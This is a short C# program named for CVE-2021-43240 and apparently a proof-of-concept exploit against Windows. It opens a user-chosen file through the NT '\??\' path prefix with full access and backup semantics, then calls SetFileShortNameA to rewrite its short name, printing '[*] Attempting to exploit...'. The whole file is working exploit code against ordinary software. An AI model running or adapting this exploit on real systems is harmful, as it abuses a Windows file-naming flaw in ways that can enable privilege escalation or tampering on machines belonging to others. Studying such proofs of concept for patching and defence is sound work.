using System;
using System.IO;
using System.Runtime.InteropServices;

namespace CVE_2021_43240 {
	class Program {

        public static int getWin32Error() {
            int error = Marshal.GetLastWin32Error();
            return error;
        }

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern IntPtr CreateFile( // LPWStr = CreateFileW
         [MarshalAs(UnmanagedType.LPWStr)] string filename,
         uint fileaccess,
         [MarshalAs(UnmanagedType.U4)] FileShare share,
         IntPtr securityAttributes, // optional SECURITY_ATTRIBUTES struct or IntPtr.Zero
         [MarshalAs(UnmanagedType.U4)] FileMode creationDisposition,
         uint flagsAndAttributes,
         IntPtr templateFile);

        [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
        public static extern int SetFileShortNameA(
             IntPtr hFile,
             String lpShortName);
        static void Main(string[] args) {
            Console.WriteLine("[*] Trying to obtain file handle");
            IntPtr hfile = CreateFile($@"\??\{args[0]}", 0x10000000, FileShare.ReadWrite, IntPtr.Zero, FileMode.Open, 0x02000000, IntPtr.Zero);
            Console.WriteLine($"[!] Got file handle {hfile.ToInt64()} - Win32({getWin32Error()}) ");
            Console.WriteLine("[*] Attempting to exploit...");
            int result = SetFileShortNameA(hfile, args[1]);
            Console.WriteLine($"[-] Results: {result} - {getWin32Error()}");
            Console.ReadLine();

        }
	}
}
